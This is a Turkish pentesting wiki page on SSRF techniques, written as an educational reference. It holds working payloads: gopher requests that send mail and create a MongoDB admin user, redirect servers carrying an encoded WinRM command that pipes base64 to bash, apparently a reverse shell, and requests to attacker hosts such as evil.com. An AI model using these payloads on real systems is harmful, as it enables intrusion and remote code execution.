# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bir **Server-side Request Forgery (SSRF)** zafiyeti, bir saldırganın bir **server-side uygulamayı** kendi seçtiği bir domaine **HTTP istekleri** göndermesi için manipüle etmesi durumunda ortaya çıkar. Bu zafiyet, sunucuyu saldırgan tarafından yönlendirilen keyfi dış isteklere maruz bırakır.

## SSRF Yakalama

İlk yapmanız gereken, sizin tarafınızdan tetiklenen bir SSRF etkileşimini yakalamaktır. Bir HTTP veya DNS etkileşimini yakalamak için şu araçları kullanabilirsiniz:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Beyaz Listeye Alınmış Domainleri Bypass Etme

Genellikle SSRF'nin yalnızca belirli beyaz listeye alınmış domainlerde veya URL'lerde çalıştığını görürsünüz. Aşağıdaki sayfada bu beyaz listeyi atlatmaya çalışmak için tekniklerin bir derlemesini bulabilirsiniz:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Open Redirect ile Bypass

Eğer sunucu doğru şekilde korunmuyorsa, web sayfası içindeki bir Open Redirect'i istismar ederek tüm kısıtlamaları bypass edebilirsiniz. Web sayfası aynı domaine yönelik SSRF'ye izin vereceği ve muhtemelen redirect'leri takip edeceği için, sunucunun iç ağdaki herhangi bir kaynağa erişmesini sağlamak amacıyla Open Redirect'i istismar edebilirsiniz.\
Daha fazla bilgi: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokoller

- **file://**
- URL şeması `file://` belirtilmiş olup doğrudan `/etc/passwd`'e işaret eder: `file:///etc/passwd`
- **dict://**
- DICT URL şeması, DICT protokolü aracılığıyla tanımlar veya kelime listelerine erişim için kullanıldığı şekilde açıklanır. Verilen örnek, belirli bir kelimeyi, veritabanını ve kayıt numarasını hedefleyen bir URL yapısını gösterir; ayrıca bir PHP scriptinin saldırgan tarafından sağlanan kimlik bilgileriyle bir DICT sunucusuna bağlanmak için kötüye kullanılabileceği örneği sunulur: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Güvenli shell üzerinden güvenli dosya transferi için bir protokol olarak tanımlanır; bir PHP scriptinin kötü amaçlı bir SFTP sunucusuna bağlanmak için nasıl kötüye kullanılabileceğini gösteren bir örnek verilir: `url=sftp://generic.com:11111/`
- **TFTP://**
- UDP üzerinden çalışan Trivial File Transfer Protocol (TFTP) bahsedilir; bir PHP scriptinin bir TFTP sunucusuna istek gönderdiği bir örnek verilir. 'generic.com' adresine, 12346 portundan 'TESTUDPPACKET' dosyası için bir TFTP isteği yapılır: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Bu bölüm Lightweight Directory Access Protocol (LDAP)'u ele alır; IP ağları üzerinden dağıtılmış dizin bilgi servislerine erişim ve yönetim için kullanımı vurgulanır. Localhost'taki bir LDAP sunucusuyla etkileşim örneği: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- SSRF zafiyetleri kullanılarak localhost'taki SMTP servisleriyle etkileşim kurulmasına yönelik bir yöntem anlatılır; dahili domain adlarını ortaya çıkarmaya yönelik adımları ve bu bilgiye dayanarak yapılacak ek araştırma adımlarını içerir.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Eğer SSRF **curl** ile çalıştırılıyorsa, curl'in [**URL globbing**](https://everything.curl.dev/cmdline/globbing) adında WAFs'i bypass etmek için kullanışlı olabilecek bir özelliği vardır. Örneğin bu [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) içinde **path traversal via `file` protocol** örneğini bulabilirsiniz:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher protokolünün sunucuyla iletişim için **IP, port and bytes** belirtme yeteneği anlatılır; payload oluşturmak için Gopherus ve remote-method-guesser gibi araçlardan bahsedilir. İki farklı kullanım gösterilmiştir:

### Gopher://

Bu protokolü kullanarak sunucunun **send** etmesini istediğiniz **IP, port and bytes**'ı belirleyebilirsiniz. Ardından, temelde bir SSRF'i istismar ederek **communicate with any TCP server** (ancak önce servise nasıl konuşulacağını bilmeniz gerekir).\
Neyse ki, [Gopherus](https://github.com/tarunkant/Gopherus) birkaç servis için payloads oluşturmakta kullanılabilir. Ek olarak, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) _gopher_ payloads'ları _Java RMI_ servisleri için oluşturmakta kullanılabilir.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin, password=admin123 ve permission=administrator ile kullanıcı oluştur
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

Sunuculardaki analytics yazılımları genellikle gelen bağlantıları izlemek için Referrer header'ı loglar; bu uygulama istemeden uygulamaları Server-Side Request Forgery (SSRF) zaafiyetlerine maruz bırakır. Çünkü bu tür yazılımlar, yönlendiren site içeriğini analiz etmek için Referrer header'da belirtilen harici URL'leri ziyaret edebilir. Bu zaafiyetleri ortaya çıkarmak için Burp Suite eklentisi "Collaborator Everywhere" önerilir; bu eklenti analytics araçlarının Referer header'ı nasıl işlediğini kullanarak potansiyel SSRF saldırı yüzeylerini tespit eder.

## SSRF sertifikadan gelen SNI verisi aracılığıyla

Basit bir yapılandırmayla herhangi bir backend'e bağlanmayı mümkün kılabilecek bir yanlış yapılandırma aşağıdaki örnek Nginx konfigürasyonu ile gösterilmiştir:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Bu yapılandırmada, Server Name Indication (SNI) alanındaki değer doğrudan backend adresi olarak kullanılır. Bu durum, Server-Side Request Forgery (SSRF) açığına yol açar; SNI alanına istenen IP adresi veya alan adını girerek istismar edilebilir. `internal.host.com` gibi rastgele bir backenda bağlantı zorlamak için `openssl` komutunu kullanan bir istismar örneği aşağıda verilmiştir:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Aşağıdaki gibi bir payload denemeye değer olabilir: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF Oluşturma

Eğer web sayfası sağladığınız bilgilerle otomatik olarak bir PDF oluşturuyorsa, PDF oluşturucu tarafından (sunucu) PDF oluşturulurken yürütülecek bazı **JS** ekleyebilir ve böylece **SSRF**'ten faydalanabilirsiniz. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Birden fazla oturum oluşturun ve bu oturumlardan **SSRF**'i kullanarak büyük dosyaları indirmeyi deneyin.

## SSRF PHP Functions

Aşağıdaki sayfayı, zafiyetli **PHP** ve hatta **Wordpress** fonksiyonları için kontrol edin:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Bazı exploit'lerde, farklı bir protokol (ör. gopher) kullanmak için **yönlendirme yanıtı göndermeniz** gerekebilir. Aşağıda yönlendirme ile cevap vermek için farklı python kodları bulunuyor:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## SSRF için yanlış yapılandırılmış proxy'ler

İpuçları [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy zafiyetli kod</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask, başlangıç karakteri olarak **`@`** kullanılmasına izin verir; bu, **ilk host name'i username yapmak** ve yeni bir tane enjekte etmek için kullanılabilir. Saldırı isteği:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Zafiyetli kod:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Bir isteğin yolunu karakter **`;`** ile başlatmanın mümkün olduğu keşfedildi; bu da daha sonra **`@`** kullanılmasına ve erişilecek yeni bir host enjekte edilmesine olanak veriyor. Saldırı isteği:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Güvenlik açığı olan PHP kodu</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP, URL path'inde bir eğik çizgiden önce **`*` karakterinin kullanılmasına** izin verir; ancak bunun yalnızca kök yol adı `/` için kullanılabileceği ve ilk eğik çizgiden önce `.` karakterlerine izin verilmediği gibi başka sınırlamaları vardır. Bu yüzden örneğin noktasız-hex kodlu bir IP adresi kullanmak gerekir:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Eğer **CORS/SOP** nedeniyle yerel bir IP'den **exfiltrate content from a local IP** yaparken **problems** yaşıyorsanız, **DNS Rebidding** bu sınırlamayı aşmak için kullanılabilir:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) bir [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) saldırısı gerçekleştirmek için kullanılan bir araçtır. attack server DNS name'in IP adresini target machine's IP address'e rebind etmek ve hedef makinedeki savunmasız yazılımları exploit etmek için attack payloads servis etmek için gerekli bileşenleri içerir.

Ayrıca [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html) adresindeki halka açık sunucuyu da inceleyin.

## DNS Rebidding + TLS Session ID/Session ticket

Gereksinimler:

- **SSRF**
- **Outbound TLS sessions**
- Yerel portlardaki servisler

Attack:

1. Kullanıcıya/bota **attacker** tarafından kontrol edilen bir **domain**e **access** etmesini söyleyin.
2. **DNS**'in **TTL**'si **0** sn'dir (böylece kurban domainin IP'sini yakında tekrar kontrol edecektir).
3. Kurban ile attacker domaini arasında bir **TLS connection** oluşturulur. Attacker, **payload**'ı **Session ID** veya **Session Ticket** içine yerleştirir.
4. **Domain**, kendisine karşı **infinite loop** halinde redirect'ler başlatır. Bunun amacı, user/bot'un domain'e erişmesini sağlamak ve domainin **again** DNS sorgusu yapmasını tetiklemektir.
5. Bu DNS sorgusunda şimdi bir **private IP** adresi verilir (ör. 127.0.0.1).
6. User/bot **TLS connection**'ı yeniden kurmaya çalışacak ve bunu yapmak için daha önce gönderilen **Session ID/Ticket ID**'yi (attacker'ın **payload**'ını içerdiği yer) **send** edecektir. Tebrikler — user/bot'un kendisine saldırmasını sağlamayı başardınız.

Not: Bu saldırı sırasında localhost:11211 (_memcache_) gibi bir hedefe saldırmak istiyorsanız, kurbanın başlangıçta www.attacker.com:11211 ile bağlantı kurmasını sağlamanız gerekir (port her zaman aynı olmalıdır).\
Bu saldırıyı gerçekleştirmek için şu aracı kullanabilirsiniz: https://github.com/jmdx/TLS-poison/\
Daha fazla bilgi için bu saldırının açıklandığı konuşmaya bakın: https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference

## Blind SSRF

Blind SSRF ile normal SSRF arasındaki fark, blind durumda SSRF isteğinin cevabını görememenizdir. Bu yüzden istismar etmek daha zordur; sadece iyi bilinen zafiyetleri kullanarak istismar yapabilirsiniz.

### Time based SSRF

Sunucunun yanıtlarının **zamanını kontrol ederek**, bir kaynağın var olup olmadığını anlamak mümkün olabilir (var olan bir kaynağa erişmek, var olmayan bir kaynağa erişmekten daha fazla zaman alabilir).

### From blid to full abusing status codes

Bu [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/)'a göre, bazı blind SSRF durumları, hedef URL 200 status code ile yanıt verse bile (ör. AWS metadata), bu verinin düzgün formatlanmamış olması ve uygulamanın bunu göstermeyi reddetmesi nedeniyle ortaya çıkabilir.

Bununla birlikte, SSRF içinde 305 ila 309 arası redirect yanıtları gönderilmesinin, uygulamanın bu redirect'leri **takip etmesine** ve bir **hata moduna girmesine** neden olarak verinin formatını artık kontrol etmemesine ve sadece yazdırmasına yol açabileceği bulunmuştur.

Bu istismarı gerçekleştirmek için kullanılan python sunucu aşağıdadır:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Adımlar:**
- İlk önce 302 uygulamanın takip etmeye başlamasını sağlar.
- Sonra 305 → 306 → 307 → 308 → 309 → 310 alır.
- 5. garip kodun ardından PoC nihayet 302 → 169.254.169.254 → 200 OK döner.

**Hedef içinde neler oluyor:**
- libcurl kendisi 305–310'u takip eder; bilinmeyen kodları sadece “follow” olarak normalleştirir.
- N garip yönlendirmeden (burada ≥ 5) sonra uygulamanın kendi wrapper'ı “something is off” diye karar verip debug amaçlı bir hata moduna geçer.
- Bu modda tüm yönlendirme zincirini ve son body'yi dış çağırıcıya dump eder.
- Sonuç: attacker tüm header'ları ve metadata JSON'u görür, mission accomplished.

Not: Bu, daha önce leak edemediğiniz status kodlarını leak edebilmek açısından ilginçtir (ör. 200). Ancak eğer bir şekilde cevap status kodunu da seçebiliyor olsaydınız (örneğin AWS metadata'sının 500 status kodu ile cevap vermesini kararlaştırabildiğinizi hayal edin), **bazı status kodları doğrudan cevabın içeriğini leak edebilir.**

### HTML-to-PDF renderers as blind SSRF gadgets

PDF render edilirken **TCPDF** gibi kütüphaneler (ve **spipu/html2pdf** gibi wrapper'lar) attacker-controlled HTML içinde bulunan herhangi bir URL'i otomatik olarak fetch eder. Her `<img>` veya `<link rel="stylesheet">` attribute'u sunucu tarafında cURL, `getimagesize()`, veya `file_get_contents()` ile çözülür; bu yüzden PDF worker'ını, HTTP response size yansıtılmasa bile iç hostları probe etmek için kullanabilirsiniz.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0, her `<img>` kaynağı için birkaç retrieval denemesi yapar, bu yüzden tek bir payload birden fazla istek üretebilir (timing-based port scans için faydalı).
- html2pdf, `<img>` için TCPDF’nin davranışını kopyalar ve `Css::extractStyle()` içinde CSS fetching ekler; bu fonksiyon basit bir scheme kontrolünden sonra `file_get_contents($href)` çağırır. Bunu loopback services, RFC1918 ranges veya cloud metadata endpoints gibi hedeflere saldırmak için kötüye kullanın.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) to leak both internal HTTP responses and local files rendered into the PDF.

Hardeners, render etmeden önce external URLs’i temizlemeli veya renderer’ı bir network sandbox içinde izole etmelidir; o zamana kadar, PDF generator’larını blind SSRF proxies olarak değerlendirin.

## Cloud SSRF Exploitation

Eğer cloud ortamında çalışan bir makinede SSRF zafiyeti bulursanız, cloud ortamı hakkında ilginç bilgiler ve hatta credentials elde edebilirsiniz:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

Birkaç bilinen platform SSRF zafiyetleri içeriyor veya daha önce içeriyordu; bunları şu dosyada kontrol edin:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Araçlar

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Bu araç şu protokoller için Gopher payloads üretir:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ bir _Java RMI_ vulnerability scanner’dır ve yaygın _Java RMI_ zafiyetleri için attack operasyonlarını destekler. Mevcut operasyonların çoğu istenen operasyon için bir _SSRF_ payload üretmek üzere `--ssrf` seçeneğini destekler. `--gopher` seçeneği ile birlikte, kullanıma hazır _gopher_ payloadları doğrudan üretilebilir.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy, Server-Side Request Forgery (SSRF) zafiyeti olan HTTP sunucuları üzerinden client HTTP trafiğini tünellemek için tasarlanmış çoklu-thread'li bir HTTP proxy sunucusudur.

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
